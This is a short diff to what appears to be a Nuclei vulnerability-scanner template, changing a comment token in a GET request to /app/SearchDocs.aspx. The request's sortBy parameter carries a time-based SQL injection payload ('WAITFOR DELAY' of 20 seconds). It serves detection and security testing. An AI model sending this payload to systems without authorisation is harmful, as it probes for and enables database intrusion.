@@ -11,7 +11,7 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/app/SearchDocs.aspx?doctypes=19&filename=*&sdate=&edate=&content=&sortBy=1%20WAITFOR%20DELAY%20%270:0:20%27--%20udTV&sortOrder=&custom={%22customFields%22:[]}"
+      - "{{BaseURL}}/app/SearchDocs.aspx?doctypes=19&filename=*&sdate=&edate=&content=&sortBy=1%20WAITFOR%20DELAY%20%270:0:20%27--%20Hello&sortOrder=&custom={%22customFields%22:[]}"
 
     headers:
       User-Agent: "sql-gremlin-nuclei"
